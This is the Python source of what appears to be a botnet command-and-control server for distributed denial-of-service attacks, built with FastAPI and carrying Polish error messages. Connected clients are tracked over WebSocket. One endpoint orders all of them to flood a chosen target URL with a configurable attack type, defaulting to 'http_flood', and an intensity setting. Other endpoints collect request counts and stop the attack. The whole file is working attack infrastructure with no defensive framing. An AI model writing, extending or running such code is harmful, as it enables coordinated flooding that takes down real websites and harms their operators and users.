from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
import json, asyncio, time

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

clients: dict = {}
stats: dict = {}
current_gen = 0
attack_running = False
started_at = 0.0


@app.websocket("/ws/{cid}")
async def ws_endpoint(websocket: WebSocket, cid: str):
    await websocket.accept()
    clients[cid] = websocket
    stats[cid] = 0
    try:
        while True:
            raw = await websocket.receive_text()
            if raw == "ping":
                await websocket.send_text("pong")
                continue
            try:
                msg = json.loads(raw)
                if (msg.get("action") == "stats"
                        and attack_running
                        and msg.get("gen") == current_gen):
                    stats[cid] = int(msg.get("count", 0))
            except Exception:
                pass
    except WebSocketDisconnect:
        clients.pop(cid, None)
        stats.pop(cid, None)


@app.get("/status")
async def status():
    return {
        "online_count": len(clients),
        "clients": list(clients.keys()),
        "total_requests": sum(stats.values()),
        "elapsed": round(time.time() - started_at, 1) if started_at else 0,
        "running": attack_running,
        "gen": current_gen,
        "per_client": dict(stats),
    }


@app.post("/command_all")
async def command_all(url: str, attack_type: str = "http_flood",
                     intensity: int = 2, duration: int = 0):
    global current_gen, attack_running, started_at
    if not clients:
        return {"status": "error", "message": "Brak klientów"}
    if not url.startswith(("http://", "https://")) and not url.replace(".", "").isdigit():
        return {"status": "error", "message": "Nieprawidłowy URL"}

    current_gen += 1
    attack_running = True
    started_at = time.time()
    for k in stats:
        stats[k] = 0

    intensity = max(1, min(16, intensity))
    payload = json.dumps({
        "action": "start",
        "gen": current_gen,
        "url": url,
        "attack_type": attack_type,
        "intensity": intensity,
    })
    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()],
                         return_exceptions=True)

    if duration > 0:
        gen_snapshot = current_gen
        asyncio.create_task(_auto_stop(duration, gen_snapshot))

    return {"status": "ok", "clients": len(clients), "gen": current_gen}


async def _auto_stop(duration: int, gen: int):
    await asyncio.sleep(duration)
    if gen == current_gen:
        await stop_all()


@app.post("/stop_all")
async def stop_all():
    global current_gen, attack_running
    current_gen += 1
    attack_running = False
    payload = json.dumps({"action": "stop"})
    await asyncio.gather(*[ws.send_text(payload) for ws in clients.values()],
                         return_exceptions=True)
    for k in stats:
        stats[k] = 0
    return {"status": "stopped", "clients": len(clients)}
